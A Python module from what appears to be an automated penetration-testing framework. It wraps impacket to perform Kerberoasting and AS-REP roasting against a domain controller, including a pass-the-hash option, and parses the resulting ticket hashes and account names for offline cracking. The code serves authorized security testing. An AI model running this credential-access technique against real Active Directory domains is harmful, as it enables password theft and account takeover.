"""Kerberoasting / AS-REP roasting wrapper — AD credential access (O5).

Requests Kerberos service tickets for SPN accounts (Kerberoasting, T1558.003) or
AS-REP hashes for accounts without pre-auth (AS-REP roasting, T1558.004) via the
impacket suite, yielding ``$krb5tgs$`` / ``$krb5asrep$`` hashes for offline
cracking. Ticket requests are ordinary Kerberos traffic (no target state change),
but this is a credential-access technique — scope-enforced, authorized, audited,
and it never cracks or uses the hashes itself.
"""

from __future__ import annotations

import re
from typing import Any

from ...schemas.tools import ToolProfile
from ..sandbox import SandboxResult
from .base import ToolWrapper

_HASH_RE = re.compile(r"\$krb5(tgs|asrep)\$[^\s]+")
#: Extract the roasted principal from a hash so the credential lifecycle can
#: attribute the captured material: TGS embeds ``*account*realm*spn*``; AS-REP
#: embeds ``user@realm:`` before the checksum.
_TGS_ACCOUNT_RE = re.compile(r"\$krb5tgs\$\d+\$\*([^*]+)\*([^*]+)\*")
_ASREP_ACCOUNT_RE = re.compile(r"\$krb5asrep\$\d+\$([^:]+)[:$]")


def principal_of(roast: str) -> str | None:
    """The ``account@realm`` a roast blob belongs to, or ``None`` if unparseable."""

    m = _TGS_ACCOUNT_RE.search(roast)
    if m is not None:
        return f"{m.group(1)}@{m.group(2)}"
    m = _ASREP_ACCOUNT_RE.search(roast)
    if m is not None:
        return m.group(1)
    return None


class KerberoastWrapper(ToolWrapper):
    name = "kerberoast"
    default_image = "ghcr.io/fortra/impacket:latest"
    default_timeout_sec = 600

    def build_argv(self, target: str, profile: ToolProfile) -> list[str]:
        domain = str(profile.args.get("domain", ""))
        username = str(profile.args.get("username", ""))
        if not domain or not username:
            raise ValueError("kerberoast requires 'domain' and 'username' args")
        mode = str(profile.args.get("mode", "kerberoast"))
        creds = f"{domain}/{username}"
        password = profile.args.get("password")
        if isinstance(password, str) and password:
            creds = f"{creds}:{password}"
        if mode == "asrep":
            # AS-REP roasting — accounts with "do not require pre-auth".
            argv = ["GetNPUsers.py", creds, "-dc-ip", target, "-request", "-format", "hashcat"]
        else:
            # Kerberoasting — request TGS for all SPN accounts.
            argv = ["GetUserSPNs.py", creds, "-dc-ip", target, "-request", "-outputfile", "-"]
        nthash = profile.args.get("hash")
        if isinstance(nthash, str) and nthash and not (isinstance(password, str) and password):
            argv += ["-hashes", nthash]
        return argv

    def is_mutating(self, profile: ToolProfile) -> bool:
        return False  # ticket requests only

    def parse(self, target: str, result: SandboxResult) -> dict[str, Any]:
        text = result.stdout.decode("utf-8", errors="replace")
        full = [m.group(0) for m in _HASH_RE.finditer(text)]
        return {
            "tool": self.name,
            "target": target,
            "hash_count": len(full),
            "kind": "asrep" if any(h.startswith("$krb5asrep$") for h in full) else "tgs",
            "roastable": len(full) > 0,
            # The captured material + its principal — what the credential
            # lifecycle (capture → crack → own) consumes. The wrapper still
            # never cracks or uses them; it only surfaces them for offline work.
            "hashes": full,
            "accounts": [p for h in full if (p := principal_of(h)) is not None],
        }
